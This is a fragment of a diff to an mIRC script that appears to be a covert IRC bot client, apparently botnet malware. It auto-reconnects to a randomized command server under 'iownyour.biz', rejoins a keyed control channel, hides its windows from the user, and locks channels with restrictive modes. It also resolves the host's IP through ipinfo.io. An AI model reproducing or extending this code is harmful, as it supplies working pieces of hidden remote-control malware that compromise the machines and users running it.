@@ -88,7 +88,7 @@ alias init {
 alias opnotice { .notice @ $+ %fldchan $2- }
 on *:DISCONNECT:.timerDC 1 1 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667) -jn %fldchan %key
 on *:PART:%fldchan:{ if ($nick == $me) .timer 1 1 join # %key } 
-on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # | .timer 1 10 clearall |  if ($me isop #) mode # -o+smPnk $me %key  }
+on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # | .timer 1 10 clearall |  if ($me isop #) mode # +smnkKo $me %key $nick  }
 alias resolve {
   set %resolve.ip $ip
   sockopen resolve.ip_ $+ $ip ipinfo.io 80
